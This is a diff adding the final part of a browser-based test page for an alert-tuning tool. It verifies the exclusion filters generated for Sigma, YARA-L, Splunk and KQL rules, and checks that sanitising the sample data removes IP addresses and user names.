+  var excelCands = an.candidates.filter(function (c) { return c.items.some(function (it) { return /EXCEL/i.test(it.v.parentImage || ""); }); });
+  truthy("every candidate containing the excel event is blocked", excelCands.length > 0 && excelCands.every(function (c) { return c.blocked; }));
+  eq("defaults pick only the narrow one", an.defaults, [unblocked[0].id]);
+  var imp = X.impact(an, an.defaults);
+  eq("impact hides 5 leaves 1", [imp.removed, imp.remaining.length], [5, 1]);
+  eq("remaining event is the excel one", /EXCEL/i.test(imp.remaining[0].v.parentImage), true);
+  eq("analysis field mapping", [an.mapping.image, an.mapping.parentImage, an.mapping.cmd, an.mapping.user], ["Image", "ParentImage", "CommandLine", "User"]);
+  var chosen = an.candidates.filter(function (c) { return an.defaults.indexOf(c.id) >= 0; });
+
+  // ================= tuner: writers =================
+  var meta = { ref: "TUNE-1", reviewer: "Pat", reviewBy: "2027-01-25", lookback: "90", basis: "6 events", created: "2026-10-27" };
+  var sigmaOut = X.generate({ format: "sigma", candidates: chosen, fields: X.defaultFields("sigma", an.mapping), meta: meta, ruleText: SK.tunerData.SAMPLE.rule });
+  truthy("sigma has filter block", sigmaOut.indexOf("filter_tuning_1:") > 0);
+  truthy("sigma condition patched", sigmaOut.indexOf("condition: selection and not 1 of filter_tuning_*") > 0, sigmaOut);
+  truthy("sigma keeps original selection", sigmaOut.indexOf("CommandLine|contains: ' -File '") > 0);
+  truthy("sigma has regex cmd", /CommandLine\|re: '\^/.test(sigmaOut));
+  truthy("sigma header present", sigmaOut.indexOf("# Review or remove by: 2027-01-25") >= 0 && sigmaOut.indexOf("# Historical check: 90 days") >= 0);
+  var sigmaOr = X.generate({ format: "sigma", candidates: chosen, fields: X.defaultFields("sigma", an.mapping), meta: meta, ruleText: "detection:\n    sel:\n        A: b\n    condition: sel1 or sel2" });
+  truthy("sigma wraps or-conditions", sigmaOr.indexOf("condition: (sel1 or sel2) and not 1 of filter_tuning_*") > 0, sigmaOr);
+  var sigmaNoRule = X.generate({ format: "sigma", candidates: chosen, fields: X.defaultFields("sigma", an.mapping), meta: meta, ruleText: "" });
+  truthy("sigma without rule gives snippet", sigmaNoRule.indexOf("Add these blocks") > 0);
+  var yaral = X.generate({ format: "yaral", candidates: chosen, fields: X.defaultFields("yaral", an.mapping), meta: meta, ruleText: "" });
+  truthy("yaral negates conditions with documented regex form", yaral.indexOf("not re.regex($e.principal.process.file.full_path, `^C:\\\\Program Files\\\\NorthwindBackup\\\\nbagent\\.exe$`) nocase") > 0, yaral);
+  truthy("yaral does not use != with nocase", yaral.indexOf("!=") < 0, yaral);
+  truthy("yaral regex in backticks", /not re\.regex\(\$e\.target\.process\.command_line, `\^/.test(yaral));
+  truthy("yaral uses comment prefix", yaral.indexOf("// Tuning exclusion for TUNE-1") === 0);
+  var spl = X.generate({ format: "splunk", candidates: chosen, fields: X.defaultFields("splunk", an.mapping), meta: meta, ruleText: "" });
+  truthy("splunk NOT block", spl.indexOf("| search NOT (") > 0 && spl.indexOf('ParentImage="C:\\\\Program Files') > 0, spl);
+  truthy("splunk uses prefix wildcard for regex cmd", spl.indexOf('-Job *"') > 0, spl);
+  var kql = X.generate({ format: "kql", candidates: chosen, fields: X.defaultFields("kql", an.mapping), meta: meta, ruleText: "" });
+  truthy("kql where not", kql.indexOf("| where not (") > 0 && kql.indexOf("InitiatingProcessFolderPath =~ @\"C:\\Program Files") > 0, kql);
+  var rx = X.generate({ format: "regex", candidates: chosen, fields: X.defaultFields("regex", an.mapping), meta: meta, ruleText: "" });
+  truthy("regex has lookahead variant", rx.indexOf("^(?!(?=") > 0);
+  var gen = X.generate({ format: "generic", candidates: chosen, fields: X.defaultFields("generic", an.mapping), meta: meta, ruleText: "" });
+  truthy("generic lists conditions", gen.indexOf("Program is exactly") > 0 && gen.indexOf("Entry 1:") > 0);
+  eq("generate with nothing selected", X.generate({ format: "sigma", candidates: [], fields: {}, meta: {}, ruleText: "" }).indexOf("Select at least one") === 0, true);
+  eq("overlap warning when rule uses same field", X.overlapWarnings(X.ruleInfo(SK.tunerData.SAMPLE.rule, "sigma"), X.defaultFields("sigma", an.mapping), chosen).indexOf("image") >= 0, true);
+
+  // privacy: sanitized sample has none of the original IP addresses
+  var sanSample = X.sanitizeAll([SK.tunerData.SAMPLE.alert, SK.tunerData.SAMPLE.rule, SK.tunerData.SAMPLE.logs], {});
+  eq("sample sanitize removes real IPs", /10\.20\.3[01]\.\d+/.test(sanSample.texts.join("\n")), false);
+  eq("sample sanitize removes profile name", /jsmith/i.test(sanSample.texts.join("\n")), false);
+  var anSan = X.analyze(X.parseLogs(sanSample.texts[2]).events);
+  eq("analysis still works after sanitize", anSan.candidates.filter(function (c) { return !c.blocked && c.level === "strict"; }).length, 1);
+
+  // ---- report ----
+  document.getElementById("summary").innerHTML = '<span class="' + (failed ? "fail" : "pass") + '">' + passed + " passed, " + failed + " failed</span>";
+  document.getElementById("out").innerHTML = lines.join("\n");
+  window.__kitDone = { passed: passed, failed: failed };
+})().catch(function (e) {
+  document.getElementById("summary").innerHTML = '<span class="fail">Test run crashed: ' + e.message + '</span>';
+  document.getElementById("out").textContent = e.stack;
+  window.__kitDone = { crashed: e.message };
+});
+</script>
+</body>
+</html>
